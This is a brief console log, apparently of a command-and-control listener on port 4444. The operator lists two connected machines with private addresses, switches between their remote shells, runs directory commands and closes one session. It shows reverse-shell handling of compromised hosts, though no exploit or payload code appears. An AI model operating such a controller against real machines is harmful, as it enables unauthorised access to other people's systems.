Listening on 0.0.0.0:4444
C2> list
192.168.1.100:54321
192.168.1.101:54322
C2> switch 192.168.1.100:54321
Shell (192.168.1.100:54321)> ls
bin
boot
dev
etc
home
...
Shell (192.168.1.100:54321)> switch
C2> switch 192.168.1.101:54322
Shell (192.168.1.101:54322)> pwd
/home/user
...
Shell (192.168.1.101:54322)> exit
Connection closed for ('192.168.1.101', 54322)
C2> list
192.168.1.100:54321
